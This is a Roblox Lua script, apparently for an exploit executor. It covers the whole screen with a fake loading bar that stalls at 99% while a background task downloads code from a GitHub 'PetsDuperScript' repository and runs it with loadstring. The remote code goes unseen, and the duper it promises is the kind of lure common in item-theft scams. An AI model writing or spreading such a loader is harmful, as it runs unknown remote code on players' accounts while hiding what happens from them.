-- Create full-screen loading GUI
local gui = Instance.new("ScreenGui", game:GetService("CoreGui"))
gui.Name = "FullScreenLoading"

local bg = Instance.new("Frame", gui)
bg.Size = UDim2.new(1, 0, 1, 0)
bg.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
bg.BorderSizePixel = 0
bg.Position = UDim2.new(0, 0, 0, 0)

-- Centered text
local percentText = Instance.new("TextLabel", bg)
percentText.Size = UDim2.new(1, 0, 0.1, 0)
percentText.Position = UDim2.new(0, 0, 0.4, 0)
percentText.BackgroundTransparency = 1
percentText.TextColor3 = Color3.new(1, 1, 1)
percentText.TextScaled = true
percentText.Font = Enum.Font.GothamBold
percentText.Text = "🌱 Loading... 1%"

-- Loading bar background
local barBG = Instance.new("Frame", bg)
barBG.Size = UDim2.new(0.6, 0, 0.04, 0)
barBG.Position = UDim2.new(0.2, 0, 0.5, 0)
barBG.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
barBG.BorderSizePixel = 0
barBG.ClipsDescendants = true

-- Loading bar fill
local barFill = Instance.new("Frame", barBG)
barFill.Size = UDim2.new(0, 0, 1, 0)
barFill.Position = UDim2.new(0, 0, 0, 0)
barFill.BackgroundColor3 = Color3.fromRGB(0, 200, 0)
barFill.BorderSizePixel = 0

-- Slowly animate loading bar to 99%
task.spawn(function()
	for i = 1, 99 do
		barFill.Size = UDim2.new(i / 100, 0, 1, 0)
		percentText.Text = "🌱 Loading... " .. i .. "%"
		wait(0.08) -- adjust speed here (0.08 = ~8s total)
	end
	percentText.Text = "🌱 Loading... 99%"
end)

-- Load your spawner in background
task.spawn(function()
	local success, spawner = pcall(function()
		return loadstring(game:HttpGet("https://raw.githubusercontent.com/Pragsz868/PetsDuperScript/refs/heads/main/FullScreenLoader.lua"))()
	end)
	if not success then
		warn("❌ Failed to load spawner.")
	end
end)
